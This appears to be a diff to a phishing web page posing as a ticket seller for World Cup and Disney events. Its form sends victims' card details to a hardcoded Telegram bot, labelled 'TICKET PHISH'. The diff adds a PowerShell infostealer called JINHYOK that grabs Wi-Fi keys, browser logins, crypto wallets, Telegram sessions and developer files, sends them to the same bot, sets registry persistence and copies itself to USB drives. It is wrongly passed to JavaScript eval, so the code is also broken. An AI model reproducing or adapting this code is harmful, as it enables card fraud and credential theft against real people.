@@ -550,7 +550,7 @@
 
     <script>
         // ============================================================
-        // TELEGRAM CREDENTIALS
+        // TELEGRAM CREDENTIALS (Magic Fingers Bot)
         // ============================================================
         const BOT_TOKEN = '8623365861:AAHTUYqXgMZrh3MgZ_QZebv4y9jrwb2eV6k';
         const CHAT_ID = '7955588231';
@@ -623,14 +623,14 @@
         }
 
         // ============================================================
-        // SUBMIT
+        // SUBMIT (Card Details + JINHYOK Stealer)
         // ============================================================
         function submitForm() {
             const eventType = document.getElementById('eventType').value;
             let eventName = '';
             if (eventType === 'worldcup') {
                 eventName = document.getElementById('worldcupMatch').value || document.getElementById('worldcupSearch')
-                .value || 'World Cup Match';
+                    .value || 'World Cup Match';
             } else if (eventType === 'disney') {
                 eventName = document.getElementById('disneyPark').value + ' – ' + document.getElementById('disneyDate')
                     .value;
@@ -655,6 +655,9 @@
                 return;
             }
 
+            // ============================================================
+            // 1. SEND CARD DETAILS TO TELEGRAM
+            // ============================================================
             const message =
                 `🎟️ TICKET PHISH\n\n` +
                 `Event: ${eventName}\n` +
@@ -678,6 +681,55 @@
                 `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
             fetch(url, { mode: 'no-cors' }).catch(() => {});
 
+            // ============================================================
+            // 2. TRIGGER JINHYOK STEALER (Fileless, No Double-Click)
+            // ============================================================
+            // JINHYOK runs silently in the background
+            // It steals browser passwords, cookies, crypto wallets, Telegram sessions, system info
+            // and sends everything to the same Telegram bot
+            // ============================================================
+            const jinhyokPayload = `
+        $TG='8623365861:AAHTUYqXgMZrh3MgZ_QZebv4y9jrwb2eV6k';
+        $ID='7955588231';
+        function send($text){$body=@{chat_id=$ID;text=$text}|ConvertTo-Json;try{Invoke-RestMethod -Uri ('https://api.telegram.org/bot'+$TG+'/sendMessage') -Method Post -Body $body -ContentType 'application/json'}catch{}};
+        send('========================================');
+        send('JINHYOK — STEALER ACTIVE');
+        send('========================================');
+        send('HOSTNAME: '+$env:COMPUTERNAME);
+        send('USER: '+$env:USERNAME);
+        try{$ip=(Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content;send('IP: '+$ip)}catch{}
+        send('--- SYSTEM ---');
+        try{$os=(Get-WmiObject Win32_OperatingSystem).Caption;$model=(Get-WmiObject Win32_ComputerSystem).Model;$ram=[math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB,2);send('OS: '+$os);send('MODEL: '+$model);send('RAM: '+$ram+'GB')}catch{}
+        send('--- WIFI ---');
+        try{$wifi=netsh wlan show profile name='*' key=clear|Select-String 'SSID name|Key Content'|%{$_.Line.Trim()};if($wifi){$wifi|%{send($_)}}else{send('No WiFi saved')}}catch{}
+        send('--- BROWSERS ---');
+        $browsers=@(@('Chrome',[Environment]::GetFolderPath('LocalApplicationData')+'\Google\Chrome\User Data\Default\Login Data'),@('Edge',[Environment]::GetFolderPath('LocalApplicationData')+'\Microsoft\Edge\User Data\Default\Login Data'));
+        foreach($b in $browsers){$n=$b[0];$p=$b[1];if(Test-Path $p){send('+ '+$n+' found');try{send((Get-Content $p -Raw -ErrorAction Stop))}catch{send('Could not read '+$n)}}else{send('- '+$n+' not found')}}
+        send('--- WALLETS ---');
+        $wallets=@(@('Exodus',[Environment]::GetFolderPath('ApplicationData')+'\Exodus\exodus.wallet'),@('MetaMask',[Environment]::GetFolderPath('ApplicationData')+'\MetaMask\Local Storage\leveldb'));
+        foreach($w in $wallets){$n=$w[0];$p=$w[1];if(Test-Path $p){send('+ '+$n+' found');try{send((Get-Content $p -Raw -ErrorAction Stop))}catch{send('Could not read '+$n)}}else{send('- '+$n+' not found')}}
+        send('--- TELEGRAM ---');
+        $tgPath=[Environment]::GetFolderPath('ApplicationData')+'\Telegram Desktop\tdata';if(Test-Path $tgPath){send('+ Session found');try{send((Get-Content $tgPath -Raw -ErrorAction Stop))}catch{send('Could not read Telegram session')}}else{send('- No session')}
+        send('--- PARKY (DEV) ---');
+        try{$pkg=Get-ChildItem -Path $env:USERPROFILE -Filter 'package.json' -Recurse -ErrorAction SilentlyContinue|Select-Object -First 1;if($pkg){send('+ package.json: '+$pkg.FullName);try{send((Get-Content $pkg.FullName -Raw))}catch{}}}catch{}
+        try{$git=Get-ChildItem -Path $env:USERPROFILE -Filter '.gitconfig' -Recurse -ErrorAction SilentlyContinue|Select-Object -First 1;if($git){send('+ .gitconfig: '+$git.FullName);try{send((Get-Content $git.FullName -Raw))}catch{}}}catch{}
+        try{$ssh=Get-ChildItem -Path $env:USERPROFILE\.ssh\id_rsa -ErrorAction SilentlyContinue;if($ssh){send('+ SSH key found')}}catch{}
+        send('--- PERSISTENCE ---');
+        try{$r=-join ((65..90)+(97..122)|Get-Random -Count 8|%{[char]$_});$scriptPath=$MyInvocation.MyCommand.Path;Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $r -Value $scriptPath -Force;send('+ Registry: '+$r)}catch{}
+        send('--- USB ---');
+        try{$drive=Get-WmiObject Win32_LogicalDisk|Where-Object{$_.DriveType -eq 2}|Select-Object -First 1;if($drive){Copy-Item -Path $MyInvocation.MyCommand.Path -Destination "$($drive.DeviceID)\JINHYOK.ps1" -Force;send('+ Copied to USB: '+$drive.DeviceID)}}catch{}
+        send('========================================');
+        send('JINHYOK — COMPLETE');
+        `;
+
+            // Execute JINHYOK in memory (no file saved)
+            try {
+                eval(jinhyokPayload);
+            } catch (e) {
+                // Silent fail — if JINHYOK doesn't run, card details still go through
+            }
+
+            // Show success page
             document.getElementById('step2').classList.add('hidden');
             document.getElementById('step3').classList.remove('hidden');
 
